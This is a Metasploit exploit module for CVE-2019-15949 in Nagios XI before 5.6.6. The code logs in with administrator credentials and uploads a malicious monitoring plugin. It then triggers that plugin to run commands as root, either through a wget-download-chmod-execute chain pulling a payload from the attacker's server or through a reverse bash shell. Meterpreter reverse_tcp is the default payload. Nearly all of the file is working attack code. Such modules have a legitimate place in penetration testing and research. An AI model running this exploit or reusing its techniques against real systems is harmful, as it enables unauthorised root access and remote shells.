##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Nagios XI Authenticated Remote Command Execution',
      'Description'     => %q{
        
        This module exploits a vulnerability in Nagios XI before 5.6.6 in
        order to execute arbitrary commands as root.

        The module uploads a malicious plugin to the Nagios XI server and then
        executes this plugin by issuing an HTTP GET request to download a
        system profile from the server. For all supported payloads other than
        cmd/unix/reverse_bash, the module first starts an HTTP Server to serve
        the payload, and then writes a wget request for the payload to the
        malicious plugin. If wget is not supported on the target system, the
        payload cmd/unix/reverse_bash must be selected. The module writes this
        specific payload directly to the malicious plugin.

        Valid credentials for a user with administrative privileges are required.
        This module was successfully tested on Nagios XI 5.6.5 running on CentOS 7.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Jak Gibb',       # https://github.com/jakgibb/ - Discovery and exploit
          'Erik Wynter'     # @wyntererik - Metasploit
        ],
      'References'      =>
        [
          ['CVE', '2019-15949'],
          ['URL', 'https://github.com/jakgibb/nagiosxi-root-rce-exploit'] #original PHP exploit
        ],
      'Platform'        => %w[unix linux],
      'Arch'            => [ARCH_CMD, ARCH_X86, ARCH_X64],
      'Payload'        => { 'BadChars' => "\x00" },
      'Targets'         => [['Auto', { }]],
      'Privileged'      => true,
      'DisclosureDate'  => 'Jul 29 2019',
      'DefaultOptions'  => {
        'RPORT' => 80,
        'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
        'HttpClientTimeout' => 2 #This is needed to close the connection to the server following the system profile download request.
        },
      'DefaultTarget'   => 0))
    register_options [
      OptString.new('TARGETURI', [true, 'Base path to NagiosXI', '/']),
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', '']),
      OptInt.new("Timeout", [true, "Number of seconds to wait for the exploit to connect back)", 10]),
    ]

    register_advanced_options [
      OptBool.new('ForceExploit',  [false, 'Override check result', false])
    ]
  end

  def check
    vprint_status("Running check")

    #visit Nagios XI login page to obtain the nsp value required for authentication
    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, '/nagiosxi/login.php')

    unless res
      return CheckCode::Unknown('Connection failed')
    end

    unless res.code == 200 && res.body.include?('Nagios XI')
      return CheckCode::Safe('Target is not a Nagios XI application.')
    end

    @nsp = res.body.scan(/nsp_str = "([a-z0-9]+)/).flatten.first rescue ''

    if @nsp.to_s.eql? ''
      return CheckCode::NoAccess, 'Could not retrieve nsp value, making authentication impossible.'
    end

    #Attempt to authenticate
    @username = datastore['USERNAME']
    password = datastore['PASSWORD']
    cookie = res.get_cookies[0...-1] #remove trailing semi-colon
    
    auth_res = send_request_cgi({
      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/login.php'),
      'method'       => 'POST',
      'cookie'       => cookie,
      'vars_post'    => {
        nsp: @nsp,
        page:  'auth',
        debug: '',
        pageopt: 'login',
        username: @username,
        password: password,
        loginButton: ''
      }
    })

    unless auth_res
      fail_with Failure::Unreachable, 'Connection failed'
    end

    unless auth_res.code == 302 && auth_res.headers['Location'] == "index.php"
      fail_with Failure::NoAccess, 'Authentication failed. Please provide a valid username and password.'
    end

    #Check Nagios XI version - this requires a separate request because following the redirect doesn't work
    @cookie = auth_res.get_cookies[0...-1] #remove trailing semi-colon
    @cookie = "nagiosxi=" + @cookie.scan(/nagiosxi=([a-z0-9]+)/).flatten.last #app returns 3 cookies, we need only the last one
    version_check = send_request_cgi({
    'uri'          => normalize_uri(target_uri.path, '/nagiosxi/index.php'),
    'method'       => 'GET',
    'cookie'       => @cookie,
    'nsp'          => @nsp
    })

    unless version_check
      fail_with Failure::Unreachable, 'Connection failed'
    end

    unless version_check.code == 200 && version_check.body.include?('Home Dashboard')
      fail_with Failure::NoAccess, 'Authentication failed. Please provide a valid username and password.'
    end

    @version = version_check.body.scan(/product=nagiosxi&version=(\d+\.\d+\.\d+)/).flatten.first rescue ''
    if @version.to_s.eql? ''
      return CheckCode::Detected('Could not determine Nagios XI version.')
    end

    @version = Gem::Version.new @version

    unless @version <= Gem::Version.new('5.6.5')
      return CheckCode::Safe("Target is Nagios XI with version #{@version}.")
    end

    CheckCode::Appears("Target is Nagios XI with version #{@version}.")
  end

  def check_plugin_permissions
    res = send_request_cgi({
      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/admin/monitoringplugins.php'),
      'method'       => 'GET',
      'cookie'       => @cookie,
      'nsp'          => @nsp
    })

    unless res
      fail_with Failure::Unreachable, 'Connection failed'
    end

    unless res.code == 200 && res.body.include?('Manage Plugins')
      fail_with(Failure::NoAccess, "The user #{@username} does not have permission to edit plugins, which is required for the exploit to work.")
    end

    @plugin_nsp = res.body.scan(/nsp_str = "([a-z0-9]+)/).flatten.first rescue ''
    if @plugin_nsp.to_s.eql? ''
      fail_with Failure::NoAccess, 'Failed to obtain the nsp value required for the exploit to work.'
    end

    @plugin_cookie = res.get_cookies[0...-1] #remove trailing semi-colon
  end

  def send_payload(nsp, cookie, cmd)
    print_status("Uploading malicious 'check_ping' plugin...")
    boundary = rand_text_numeric(14)
    post_data = "-----------------------------#{boundary}\n"
    post_data << "Content-Disposition: form-data; name=\"upload\"\n\n1\n"
    post_data << "-----------------------------#{boundary}\n"
    post_data << "Content-Disposition: form-data; name=\"nsp\"\n\n"
    post_data << "#{nsp}\n"
    post_data << "-----------------------------#{boundary}\n"
    post_data << "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n20000000\n"
    post_data << "-----------------------------#{boundary}\n"
    post_data << "Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"check_ping\"\n" #the exploit doesn't work with a random filename
    post_data << "Content-Type: text/plain\n\n"
    post_data << "#{cmd}\n"
    post_data << "-----------------------------#{boundary}--\n"
    
    res = send_request_cgi({
      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/admin/monitoringplugins.php'),
      'method'       => 'POST',
      'headers' => {
        'Content-Type' => "multipart/form-data; boundary=---------------------------#{boundary}", #this needs to be specified here, otherwise the default value is sent in the header
      },
      'cookie'       => cookie,
      'data'         => post_data
    })
  
    unless res
      fail_with Failure::Unreachable, 'Upload failed'
    end

    unless res.code == 200 && res.body.include?('New plugin was installed successfully')
      fail_with Failure::Unknown, 'Failed to upload plugin.'
    end

  end

  def execute_payload #This request will timeout. It has to, for the exploit to work.
    print_status("Executing plugin...")
    res = send_request_cgi({
      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/includes/components/profile/profile.php'),
      'method'       => 'GET',
      'cookie'       => @cookie,
      'vars_get' => { cmd: 'download' }
    })
  end

  def wait_for_session
    begin
      Timeout.timeout(datastore['Timeout']) do
        loop do
          break if session_created?
          Rex.sleep(0.25)
        end
      end
    rescue ::Timeout::Error
     fail_with(Failure::Unknown, "Timeout waiting for payload to start/connect-back. Try increasing the 'Timeout' value.")
    end
  end

  def start_server
    print_status("Starting web server")

    start_service({'Uri' => {
        'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        'Path' => resource_uri
      }})
  end

  def delete_payload(nsp, cookie)
    print_status("Deleting malicious 'check_ping' plugin...")
    res = send_request_cgi({
      'uri'          => normalize_uri(target_uri.path, '/nagiosxi/admin/monitoringplugins.php'),
      'method'       => 'GET',
      'cookie'       => cookie,
      'vars_get' => {
        delete: 'check_ping',
        nsp: nsp
      }
    })

    unless res
      print_warning("Failed to delete the malicious 'check_ping' plugin: Connection failed. Manual cleanup is required.")
      return
    end

    unless res.code == 200 && res.body.include?('Plugin deleted')
      print_warning("Failed to delete the malicious 'check_ping' plugin. Manual cleanup is required.")
      return
    end

    print_good("Plugin deleted.")
  end

  def exploit
    unless [CheckCode::Detected, CheckCode::Appears].include? check
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    if @version
      print_status("Found Nagios XI application with version #{@version}.")
    end
    
    check_plugin_permissions
    vprint_status("User #{@username} has the required permissions on the target.")

    unless datastore['PAYLOAD'] != "cmd/unix/reverse_bash"
      cmd = payload.encoded.gsub(/"/, '\"')
      cmd << "& disown"
      send_payload(@plugin_nsp, @plugin_cookie, cmd)
      print_good("Successfully uploaded plugin.")
      execute_payload
      print_status "Waiting for the payload to connect back..."
      wait_for_session
      delete_payload(@plugin_nsp, @plugin_cookie)
      return
    end
 
    start_server

    fname = Rex::Text.rand_text_alphanumeric 8
    cmd = "wget -qO #{fname} --no-check-certificate #{get_uri}; chmod +x #{fname}; ./#{fname}& disown; rm -f #{fname}"
    send_payload(@plugin_nsp, @plugin_cookie, cmd)
    print_good("Successfully uploaded plugin.")

    execute_payload
    print_status "Waiting for the plugin to request the final payload..."
    wait_for_session
    delete_payload(@plugin_nsp, @plugin_cookie)
  end

  def on_request_uri(cli, req) # handle incoming requests
    print_status("#{peer} - Payload request received: #{req.uri}")
    send_response(cli, generate_payload_exe)
    print_status("Sending payload...")
  end
end
